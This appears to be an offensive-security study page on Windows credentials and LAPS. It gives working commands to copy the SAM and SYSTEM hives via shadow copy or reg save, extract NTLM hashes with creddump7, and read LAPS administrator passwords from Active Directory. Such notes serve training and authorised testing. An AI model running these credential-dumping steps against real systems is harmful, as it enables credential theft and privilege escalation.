---
layout:     post
author:     0x5c4r3
type: docs
permalink: Windows_Creds_And_LAPS
---


<span style="font-size: 35px; color:red"><b>Windows Credentials and LAPS</b></span>
&nbsp;

Security Account Manager (SAM, <span style="color:red">C:\Windows\System32\config\SAM</span>) Database: DB that stores Local Windows Credentials as NTLM hashes (MD4 algorithm).
Every Windows account has a unique SID (Security Identifier): <span style="color:red">S-R-I-S</span> 
In this structure, the SID begins with a literal "S" to identify the string as a SID, followed by a <span style="color:red">revision level</span> (usually set to "1"), an <span style="color:red">identifier-authority</span> value (often "5") and one or more <span style="color:red">subauthority</span> values. The subauthority will always end with a <span style="color:red">Relative Identifier</span> (RID) representing a specific object on the machine.

To get SID of local administrator account, first ask for computername:
```powershell
$env:computername
```
And then check the SID passing the computername as parameter:
```powershell
[wmi] "Win32_userAccount.Domain='client',Name='Administrator'"
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Dump SAM Credentials</b></span>

Create shadow volume 
```shell
wmic shadowcopy call create Volume='C:\'
```
To double check (should output something like <span style="color:red">Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</span>):
```shell
vssadmin list shadows
```
And copy the SAM db from it:
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam
```
OR
save SAM and SYSTEM from registry:
```shell
reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam
reg save HKLM\system C:\users\offsec.corp1\Downloads\system
```
We then need to decrypt the DB:
```shell
sudo apt install python-crypto
sudo git clone https://github.com/Neohapsis/creddump7
```
and use it:
```
python pwdump.py /home/kali/system /home/kali/sam
```
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>LAPS</b></span>
<span style="color:red">Local Administrator Password Solution</span>
Secure and scalable way of remotely managing the local administrator password for domain-joined computers.

Get all computers that are set up with LAPS (might not show plaintext password):
```powershell
Import-Module .\LAPSToolkit.ps1
Get-LAPSComputers
```

Get groups and then memebers that can fully enumerate the LAPS data (if showing "readers"):
```powershell
Find-LAPSDelegatedGroups
Get-NetGroupMember -GroupName "<Name_of_the_readers_group>"
```
If the user is in LAPS group, you can read the administrator password with:
```powershell
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
```



